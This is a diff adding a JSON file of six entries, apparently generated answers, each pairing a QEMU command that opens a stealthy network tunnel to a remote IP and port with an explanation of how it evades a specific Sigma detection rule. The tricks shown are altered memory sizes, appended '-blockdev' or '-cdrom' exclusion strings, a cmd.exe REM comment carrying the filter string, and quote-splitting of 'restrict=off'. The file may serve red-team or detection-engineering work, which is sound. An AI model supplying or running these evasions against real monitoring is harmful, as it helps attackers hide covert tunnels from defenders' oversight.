@@ -1,0 +1,26 @@
+[
+  {
+    "output": "qemu-system-x86_64.exe -m 4M -netdev user,id=n0,restrict=off,connect=192.168.1.100:443 -nographic",
+    "explanation": "The Sigma rule specifically looks for memory sizes of 1M, 2M, or 3M ('-m 1M', '-m 2M', '-m 3M'). By slightly increasing the allocated memory size to 4MB ('-m 4M'), the first condition of the selection block evaluates to false, completely evading detection while still maintaining a tiny resource footprint suitable for a stealthy tunnel."
+  },
+  {
+    "output": "qemu-system-x86_64.exe -m 1M -netdev user,id=n0,restrict=off,connect=192.168.1.100:443 -nographic -blockdev driver=null,node-name=dummy",
+    "explanation": "The rule explicitly excludes commands containing the exact string ' -blockdev '. By appending a benign or dummy block device configuration using this flag, the command intentionally triggers the 'filter_main_normal_usecase' condition, overriding the detection logic."
+  },
+  {
+    "output": "cmd.exe /c \"qemu-system-i386.exe -m 1M -netdev user,id=n1,restrict=off,connect=10.0.0.5:80 -nographic & REM  -cdrom \"",
+    "explanation": "By executing the Qemu command through cmd.exe and appending a standard comment (REM) that includes the exact exclusion string ' -cdrom ', the raw command line logged by Windows process creation events (Event ID 4688 or Sysmon Event ID 1) will contain the filter string. The SIEM will evaluate the filter as true and discard the alert, assuming it is normal usage."
+  },
+  {
+    "output": "qemu-system-x86_64.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=192.168.1.10:443 -nographic -cdrom NUL",
+    "explanation": "This command bypasses the Sigma rule by explicitly including the ' -cdrom ' string, which triggers the 'filter_main_normal_usecase' exclusion. Because the condition is 'selection and not 1 of filter_main_*', matching the filter drops the alert. Additionally, changing the memory flag from '-m 1M' to '-m 4M' would also easily bypass the rule since the 'selection' hardcodes only 1M, 2M, and 3M."
+  },
+  {
+    "output": "qemu-system-x86_64.exe -m 4M -netdev user,id=net0,restrict=n,connect=127.0.0.1:4444 -display none -cdrom dummy.iso",
+    "explanation": "This command bypasses the rule by addressing three specific detection points: 1. It uses '-m 4M', which is outside the detected range of 1M-3M. 2. It uses '-display none' instead of '-nographic' to achieve the same hidden UI effect. 3. It includes the '-cdrom' flag, which triggers the 'filter_main_normal_usecase' and causes the SIEM to ignore the event even if other suspicious parameters were present."
+  },
+  {
+    "output": "qemu-system-x86_64.exe -m 512K -netdev \"user,id=vlan0,restrict=o\"\"ff,connect=10.0.0.5:8080\" -nographic",
+    "explanation": "This bypasses the 'selection' logic by using a memory allocation smaller than the monitored 1M-3M range (512K). Additionally, it uses internal quoting/breaking within the CommandLine string for 'restrict=off', which can often evade simple string-match 'contains' logic in many SIEM implementations while remaining valid for the QEMU parser."
+  }
+]
